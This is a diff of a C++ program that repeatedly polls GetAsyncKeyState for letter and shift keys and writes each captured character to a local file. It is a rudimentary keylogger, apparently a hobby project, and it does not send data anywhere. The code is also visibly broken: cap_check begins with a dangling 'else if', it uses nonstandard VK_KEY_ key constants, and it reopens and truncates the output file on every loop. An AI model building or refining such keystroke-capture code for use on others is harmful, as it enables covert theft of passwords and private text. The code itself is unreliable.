@@ -2,11 +2,13 @@
 #include <iostream>
 #include <fstream>
 char checks();
+char cap_check();
 int main(){
+  //main loop... doesn't break, ever
   while(true==true){
-    if(file.is_open()){
     ofstream file;
     file.open("file.txt");
+    if(file.is_open()){
     file<<checks();
     }    
     else{
@@ -18,80 +20,168 @@ int main(){
   }
 }
 char checks(){
+  //for lowercase letters
   if(GetAsyncKeyState(VK_KEY_A)){
     return 'a';
   }
-    if(GetAsyncKeyState(VK_KEY_B)){
+   else if(GetAsyncKeyState(VK_KEY_B)){
     return 'b';
   }  
-  if(GetAsyncKeyState(VK_KEY_C)){
+  else if(GetAsyncKeyState(VK_KEY_C)){
+    return 'c';
+  }
+   else if(GetAsyncKeyState(VK_KEY_D)){
     return 'd';
   }
-    if(GetAsyncKeyState(VK_KEY_E)){
+   else if(GetAsyncKeyState(VK_KEY_E)){
     return 'e';
   }
-    if(GetAsyncKeyState(VK_KEY_F)){
+    else if(GetAsyncKeyState(VK_KEY_F)){
     return 'f';
   }
-    if(GetAsyncKeyState(VK_KEY_G)){
+    else if(GetAsyncKeyState(VK_KEY_G)){
     return 'g';
   }
-    if(GetAsyncKeyState(VK_KEY_H)){
+    else if(GetAsyncKeyState(VK_KEY_H)){
     return 'h';
   }
-    if(GetAsyncKeyState(VK_KEY_I)){
+    else if(GetAsyncKeyState(VK_KEY_I)){
     return 'i';
   }
-    if(GetAsyncKeyState(VK_KEY_J)){
+    else if(GetAsyncKeyState(VK_KEY_J)){
     return 'j';
   }
-    if(GetAsyncKeyState(VK_KEY_K)){
+    else if(GetAsyncKeyState(VK_KEY_K)){
     return 'k';
   }
-    if(GetAsyncKeyState(VK_KEY_L)){
+    else if(GetAsyncKeyState(VK_KEY_L)){
     return 'l';
   }
-    if(GetAsyncKeyState(VK_KEY_M)){
+    else if(GetAsyncKeyState(VK_KEY_M)){
     return 'm';
   }
-    if(GetAsyncKeyState(VK_KEY_N)){
+    else if(GetAsyncKeyState(VK_KEY_N)){
     return 'n';
   }
-    if(GetAsyncKeyState(VK_KEY_O)){
+    else if(GetAsyncKeyState(VK_KEY_O)){
     return 'o';
   }
-    if(GetAsyncKeyState(VK_KEY_P)){
+    else if(GetAsyncKeyState(VK_KEY_P)){
     return 'p';
   }
-    if(GetAsyncKeyState(VK_KEY_Q)){
+    else if(GetAsyncKeyState(VK_KEY_Q)){
     return 'q';
   }
-    if(GetAsyncKeyState(VK_KEY_R)){
+    else if(GetAsyncKeyState(VK_KEY_R)){
     return 'r';
   }
-    if(GetAsyncKeyState(VK_KEY_S)){
+    else if(GetAsyncKeyState(VK_KEY_S)){
     return 's';
   }
-    if(GetAsyncKeyState(VK_KEY_T)){
+    else if(GetAsyncKeyState(VK_KEY_T)){
     return 't';
   }
-    if(GetAsyncKeyState(VK_KEY_U)){
+    else if(GetAsyncKeyState(VK_KEY_U)){
     return 'u';
   }
-    if(GetAsyncKeyState(VK_KEY_V)){
+    else if(GetAsyncKeyState(VK_KEY_V)){
     return 'v';
   }
-    if(GetAsyncKeyState(VK_KEY_W)){
+    else if(GetAsyncKeyState(VK_KEY_W)){
     return 'w';
   }
-    if(GetAsyncKeyState(VK_KEY_X)){
+    else if(GetAsyncKeyState(VK_KEY_X)){
     return 'x';
   }
-    if(GetAsyncKeyState(VK_KEY_Y)){
+    else if(GetAsyncKeyState(VK_KEY_Y)){
     return 'y';
   }
-    if(GetAsyncKeyState(VK_KEY_Z)){
+    else if(GetAsyncKeyState(VK_KEY_Z)){
     return 'z';
+  }
+  //checks for caps
+  else if(GetAsyncKeyState(VK_RSHIFT)||GetAsyncKeyState(VK_LSHIFT)){
+    return cap_check();
+  }
+}
+char cap_check(){
+      else if(GetAsyncKeyState(VK_KEY_A)){
+    return 'A';
+  }
+    else if(GetAsyncKeyState(VK_KEY_B)){
+    return 'B';
+  }  
+    else if(GetAsyncKeyState(VK_KEY_D)){
+    return 'D';
+  }
+  else if(GetAsyncKeyState(VK_KEY_C)){
+    return 'C';
+  }
+    else if(GetAsyncKeyState(VK_KEY_E)){
+    return 'E';
+  }
+    else if(GetAsyncKeyState(VK_KEY_F)){
+    return 'F';
+  }
+    else if(GetAsyncKeyState(VK_KEY_G)){
+    return 'G';
+  }
+    else if(GetAsyncKeyState(VK_KEY_H)){
+    return 'H';
+  }
+    else if(GetAsyncKeyState(VK_KEY_I)){
+    return 'I';
+  }
+    else if(GetAsyncKeyState(VK_KEY_J)){
+    return 'J';
+  }
+    else if(GetAsyncKeyState(VK_KEY_K)){
+    return 'K';
+  }
+    else if(GetAsyncKeyState(VK_KEY_L)){
+    return 'L';
+  }
+    else if(GetAsyncKeyState(VK_KEY_M)){
+    return 'M';
+  }
+    else if(GetAsyncKeyState(VK_KEY_N)){
+    return 'N';
+  }
+    else if(GetAsyncKeyState(VK_KEY_O)){
+    return 'O';
+  }
+    else if(GetAsyncKeyState(VK_KEY_P)){
+    return 'P';
+  }
+    else if(GetAsyncKeyState(VK_KEY_Q)){
+    return 'Q';
+  }
+    else if(GetAsyncKeyState(VK_KEY_R)){
+    return 'R';
+  }
+    else if(GetAsyncKeyState(VK_KEY_S)){
+    return 'S';
+  }
+    else if(GetAsyncKeyState(VK_KEY_T)){
+    return 'T';
+  }
+    else if(GetAsyncKeyState(VK_KEY_U)){
+    return 'U';
+  }
+    else if(GetAsyncKeyState(VK_KEY_V)){
+    return 'V';
+  }
+    else if(GetAsyncKeyState(VK_KEY_W)){
+    return 'W';
+  }
+    else if(GetAsyncKeyState(VK_KEY_X)){
+    return 'X';
+  }
+    else if(GetAsyncKeyState(VK_KEY_Y)){
+    return 'Y';
+  }
+    else if(GetAsyncKeyState(VK_KEY_Z)){
+    return 'Z';
   }
   
 }
